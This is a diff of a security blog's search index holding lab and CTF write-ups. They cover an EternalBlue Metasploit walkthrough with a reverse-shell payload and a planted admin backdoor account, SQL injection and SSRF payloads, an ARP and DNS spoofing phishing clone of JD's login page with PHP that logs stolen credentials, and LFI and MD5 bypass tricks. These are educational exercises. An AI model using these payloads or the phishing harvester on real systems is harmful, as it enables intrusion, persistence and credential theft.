+<p>输入search　MS17-010</p>
+<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
+<p>运行</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>
+
+<p>输入 show options  查看需要配置哪些信息</p>
+<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
+<p>RPORT 为目标端口号(445)</p>
+<p>LHOST 为监听主机IP(10.1.1.1)</p>
+<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
+<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
+<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
+<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>
+
+
+
+<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
+<p>成功获取shell</p>
+<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
+<p>查看ip地址验证是否为目标主机。</p>
+<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
+<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
+<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>
+
+<p>Username:test </p>
+<p>password:abc123.com</p>
+<p>将该用户加入管理员组，使其拥有管理员权限</p>
+<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>
+
+<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
+<p>目标主机上用户创建成功</p>
+<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
+<p>  <strong>实验结束</strong></p>
+]]></content>
+      <categories>
+        <category>网安作业</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fakebook</title>
+    <url>/2020/09/27/fakebook/</url>
+    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
+<span id="more"></span>
+
+<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
+<p>接下来继续注入的常规操作。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
+<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
+<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
+<p><strong>爆表名</strong></p>
+<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
+<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
+<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
+<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
+<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
+<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
+<p>爆出一大堆列名。直接读取data的内容</p>
+<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
+<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
+<p>发现内容是注册时信息保存为序列化内容</p>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
+<p>到这里就不知道怎么办了。。。</p>
+<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
+<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
+<p>源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
+    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
+    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$ch</span> = curl_init();
+
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
+    &#125;
+    curl_close(<span class="hljs-variable">$ch</span>);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
+    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
+&#125;
+&#125;</code></pre>
+<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
+<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
+<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
+
+<p>查看源码，解base64。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>unserailize</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>diaoyu</title>
+    <url>/2020/07/18/diaoyu/</url>
+    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
+<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
+<span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//pass也一样</span>
+<span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;您已捕获京东账号及密码1个：&quot;</span> . <span class="hljs-string">&quot; 用户名 &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; 密码 &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
+<span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//打开1.txt</span>
+@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
+<span class="hljs-meta">?&gt;</span>
+&lt;html&gt;
+&lt;head&gt;
+&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
+		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">		</span>&#123;
+			window.history.back() <span class="hljs-comment">//后退+刷新</span>
+		&#125;
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p>
+<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）">www.jd.com看看网站发布是否成功）</a></p>
+<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
+<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录">www.jd.com输入用户名密码然后点击登录</a></p>
+<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>DNS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jdtest</title>
     <url>/2020/07/18/jdtest/</url>
     <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><span id="more"></span>
@@ -2291,148 +2291,6 @@ urls = re.findall(findlinks, html)
 ]]></content>
       <tags>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>nctf</title>
-    <url>/2020/08/29/nctf/</url>
-    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><span id="more"></span>
-
-<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
-<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
-<p><strong>md5函数漏洞</strong></p>
-<p>源码</p>
-<pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
-<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
-<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
-<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;
-&#125; <span class="hljs-keyword">else</span> &#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;
-&#125;&#125;
-<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre>
-
-<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
-<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
-<p>常见的payload有</p>
-<pre><code class="hljs c++">QNKCDZO
-<span class="hljs-number">240610708</span>
-s878926199a
-s155964671a
-s214587387a
-s214587387a
- sha1(str)
-sha1(&#x27;aaroZmOk&#x27;)  
-sha1(&#x27;aaK1STfY&#x27;)
-sha1(&#x27;aaO8zKZF&#x27;)
-sha1(&#x27;aa3OFF9m&#x27;)</code></pre>
-
-<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
-<p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
-<p>再次输入口令即可。</p>
-<p>考点为前端代码修改</p>
-<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
-<p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
-<p>在最后发现flag</p>
-<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
-<p><img src="https://i.loli.net/2020/11/30/4W9UOAMgLTohsJP.png" alt></p>
-<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
-<p>点击发现url改变，跳转到了另一个页面</p>
-<p>bp抓包试试，go一下，相应包中出现flag</p>
-<p><img src="/2020/08/29/nctf/ds1.png" alt></p>
-<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
-<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
-<p><img src="https://i.loli.net/2020/11/30/iXYv8R4MDTfr1ul.png" alt></p>
-<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
-<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
-<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
-<p>base64解码</p>
-<pre><code class="hljs php+HTML">&lt;html&gt;
-    &lt;title&gt;asdf&lt;&#x2F;title&gt;
-&lt;?php
-	error_reporting(0);
-	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
-	$file&#x3D;$_GET[&#39;file&#39;];
-	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
-		echo &quot;Oh no!&quot;;
-		exit();
-	&#125;
-	include($file); 
-&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
-?&gt;
-&lt;&#x2F;html&gt;</code></pre>
-
-<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
-<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
-<p> <strong>TIP: 0==not</strong> </p>
-<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code>   go</p>
-<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
-<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据">元数据</a>（Metadata，又称元数据）。</strong></p>
-<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
-<p>查看robots.txt</p>
-<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
-<pre><code class="hljs php">TIP:sql.php
-<span class="hljs-comment">//这里提示sql.php的源码如下</span></code></pre>
-
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id]) &#123;
-   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
-  mysql_select_db(SAE_MYSQL_DB);
-  <span class="hljs-variable">$id</span> = intval(<span class="hljs-variable">$_GET</span>[id]);
-  <span class="hljs-variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="hljs-string">&quot;select content from ctf2 where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>));
-  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[id]==<span class="hljs-number">1024</span>) &#123;
-      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;</span>;
-  &#125;
-  <span class="hljs-keyword">else</span>&#123;
-    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$query</span>[content]);
-  &#125;
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
-<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
-<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
-<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
-<p>想到了intval()函数的作用，尝试id=1024.1</p>
-<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
-<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>])) &#123;
-       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)
-           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;必须输入数字才行&#x27;</span>;
-       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)   
-           <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
-       <span class="hljs-keyword">else</span>
-           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;骚年，继续努力吧啊~&#x27;</span>;
-   &#125;</code></pre>
-
-<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
-<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
-<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
-&#123;
-<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])
-<span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
-<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
-<span class="hljs-keyword">else</span>
-<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;
-&#125; 
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
-<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
-<p>payload:</p>
-<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
-<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
-<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
